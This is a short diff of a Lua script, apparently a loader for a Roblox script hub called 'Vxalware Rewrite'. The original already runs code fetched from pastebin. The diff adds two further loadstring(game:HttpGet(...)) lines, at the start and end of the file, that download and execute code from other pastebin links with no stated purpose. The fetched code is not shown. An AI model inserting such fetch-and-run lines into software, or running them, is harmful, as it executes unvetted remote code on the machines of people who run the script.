@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://pastebin.com/raw/gPjLN0rN"))()
 local UserInputService = game:GetService("UserInputService")
 
 if UserInputService.TouchEnabled then
@@ -16,3 +17,4 @@ else
     loadstring(game:HttpGet("https://pastebin.com/raw/JiuPNQTn",true))()
 end
 -- Vxalware Rewrite | Full Mobile and PC Support!
+loadstring(game:HttpGet("https://pastebin.com/raw/i0TCy4c4"))()
